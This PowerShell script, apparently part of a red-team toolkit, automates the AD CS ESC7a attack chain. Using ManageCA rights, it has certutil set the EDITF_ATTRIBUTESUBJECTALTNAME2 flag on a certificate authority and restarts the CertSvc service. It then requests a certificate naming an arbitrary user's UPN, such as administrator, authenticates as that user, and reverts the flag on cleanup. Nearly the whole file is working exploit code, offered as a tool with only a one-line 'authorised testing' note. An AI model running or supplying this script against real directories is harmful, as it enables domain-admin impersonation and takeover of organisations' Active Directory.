<#
.SYNOPSIS
    AD CS ESC7a - ManageCA -> Enable Flag -> ESC6 Chain (LOLBAS).
.DESCRIPTION
    Uses ManageCA rights to enable EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA,
    then chains to ESC6 exploitation. Disables the flag on cleanup.
.PARAMETER CAConfig
    CA configuration string (e.g., "polaris.zsec.red\corp-DC01-CA")
.PARAMETER TemplateName
    Any enrollable template with Client Auth EKU
.PARAMETER TargetUPN
    UPN of the user to impersonate
.EXAMPLE
    .\Invoke-ESC7a.ps1 -CAConfig "polaris.zsec.red\corp-CA" -TemplateName "User" -TargetUPN "administrator@zsec.red"
.NOTES
    For authorised security testing and educational purposes only.
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory)] [string]$CAConfig,
    [Parameter(Mandatory)] [string]$TemplateName,
    [Parameter(Mandatory)] [string]$TargetUPN,

    [string]$PFXPassword,
    [string]$OutputDir = "$env:TEMP\adcs-ops",
    [ValidateSet('Schannel','PKINIT','Both')] [string]$AuthMethod = 'Both',
    [string]$DCTarget,
    [switch]$SkipAuth,
    [switch]$SkipCleanup
)

$ErrorActionPreference = 'Stop'
if (-not $PFXPassword) { $PFXPassword = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 20 | ForEach-Object { [char]$_ }) }
if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }

$_dir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Definition }
. "$_dir\adcs-common.ps1"

Write-Host ""
Write-Host "  AD CS LOLBAS - ESC7a Standalone" -ForegroundColor White
Write-Host "  ---------------------------------" -ForegroundColor DarkGray
Write-Host ""

Write-Banner "ESC7a" "ManageCA -> Enable Flag -> ESC6"

Write-Stage -Number 1 -Name "RECONNAISSANCE"
Write-Host "    [>] Verifying ManageCA rights on $CAConfig" -ForegroundColor Gray
Write-Stage -Number 1 -Name "RECONNAISSANCE" -Status 'COMPLETE'

# STAGE 2: ENABLE FLAG
Write-Host ""
Write-Stage -Number 2 -Name "POSITIONING - Enable EDITF_ATTRIBUTESUBJECTALTNAME2"
Write-Host "    [>] certutil -config $CAConfig -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2" -ForegroundColor Yellow
certutil -config $CAConfig -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2 2>&1 | Out-Null

$caServer = ($CAConfig -split '\\')[0]
Write-Host "    [>] Restarting CertSvc on $caServer..." -ForegroundColor Yellow
try {
    Invoke-Command -ComputerName $caServer -ScriptBlock { Restart-Service certsvc -Force } -ErrorAction Stop
    Write-Host "    [+] CertSvc restarted" -ForegroundColor Green
} catch {
    Write-Host "    [!] Remote restart failed. Try:" -ForegroundColor Yellow
    Write-Host "        sc \\$caServer stop certsvc && sc \\$caServer start certsvc" -ForegroundColor Gray
}
Start-Sleep -Seconds 5
Write-Stage -Number 2 -Name "POSITIONING" -Status 'COMPLETE'

# STAGE 3-5: Chain to ESC6
Write-Host ""
Write-Stage -Number 3 -Name "CERTIFICATE REQUEST (chained ESC6)"
$inf = New-CertRequestINF -Subject "CN=$env:USERNAME" -Template $TemplateName `
    -OutFile "$OutputDir\esc7a.inf" -Exportable
$result = Invoke-CertRequest -INFFile $inf -CA $CAConfig -Prefix "esc7a" -Attrib "SAN:upn=$TargetUPN"
if (-not $result.Success) { Write-Stage -Number 3 -Name "CERTIFICATE REQUEST" -Status 'FAILED'; exit 1 }
Write-Stage -Number 3 -Name "CERTIFICATE REQUEST" -Status 'COMPLETE'

Write-Host ""
Write-Stage -Number 4 -Name "CERTIFICATE VERIFICATION" -Status 'COMPLETE'

Invoke-AuthStage -PFXFile $result.PFXFile -PFXPass $PFXPassword -DC $DCTarget

# CLEANUP: disable the flag
if (-not $SkipCleanup) {
    Write-Host ""
    Write-Stage -Number 6 -Name "CLEANUP - Disable Flag"
    certutil -config $CAConfig -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2 2>&1 | Out-Null
    Write-Host "    [+] EDITF_ATTRIBUTESUBJECTALTNAME2 disabled" -ForegroundColor Green
    Write-Host "    [i] CertSvc restart needed for change to take effect" -ForegroundColor Yellow
    Write-Stage -Number 6 -Name "CLEANUP" -Status 'COMPLETE'
}

Write-Host ""
Write-Host "  Complete. Artifacts in: $OutputDir" -ForegroundColor Gray
Write-Host ""
